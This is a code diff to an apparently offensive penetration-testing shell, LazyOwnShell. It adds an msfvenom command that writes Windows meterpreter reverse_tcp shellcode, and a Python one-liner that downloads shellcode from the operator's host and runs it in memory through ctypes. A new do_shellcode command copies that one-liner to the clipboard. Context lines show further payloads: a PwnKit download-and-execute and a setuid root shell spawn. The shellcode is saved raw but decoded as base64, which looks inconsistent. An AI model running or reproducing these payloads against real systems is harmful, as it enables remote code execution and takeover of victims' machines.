@@ -1730,6 +1730,7 @@ class LazyOwnShell(Cmd):
         print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
         print_msg("14: windows/x64/meterpreter/reverse_tcp (C - shikata_ga_nai) 33 iteraciones")
         print_msg("15: android/meterpreter/reverse_tcp")
+        
         choice = input("Enter your choice (1-15): ").strip()
 
         # Define payload commands
@@ -1765,6 +1766,7 @@ class LazyOwnShell(Cmd):
                 time.sleep(15)
                 print_warn("codificando payload shell_encoded.exe ")
             os.system(commands[choice])
+            os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
             print_msg(f"Generated payload: {commands[choice]}")
             if choice == '15':
                 os.system("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
@@ -4570,6 +4572,7 @@ class LazyOwnShell(Cmd):
             ("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
             ("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
             ("python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
+            ("python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
             ("locate httpd.conf files", "locate httpd.conf"),
             ("locate vhosts.conf files", "locate vhosts.conf"),
@@ -7621,6 +7624,33 @@ class LazyOwnShell(Cmd):
         run_script_path = "run"
         subprocess.run(["proxychains", "bash", run_script_path] + sys.argv[1:])
         sys.exit()
+    def do_shellcode(self, line):
+        """
+        Generates a Python one-liner to execute shellcode from a given URL.
+        
+        This function:
+        1. Retrieves the local host (lhost) from the parameters.
+        2. Checks if the local host is valid.
+        3. Verifies the existence of the `shellcode.bin` file in the expected directory.
+        4. Constructs a Python one-liner command that:
+            - Fetches the shellcode from the specified URL.
+            - Decodes the base64-encoded shellcode.
+            - Creates a buffer in memory for the shellcode.
+            - Casts the buffer to a function pointer.
+            - Executes the shellcode.
+        5. Copies the generated command to the clipboard for easy execution.
+        """
+
+        lhost = self.params['lhost']
+        if not check_lhost(lhost):
+            return
+        path = os.getcwd()
+        if not os.path.exists(f"{path}/sessions/shellcode.bin"):
+            print_error(f"shellcode.bin must exist, you need {GREEN}run lazymsfvenom {RED}or {GREEN}venom {RED}before {GREEN}shellcode {RED}command")
+            return
+        command = f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'
+        copy2clip(command)
+        return
 
 def xor_encrypt_decrypt(data, key):
     """XOR Encrypt or Decrypt data with a given key"""
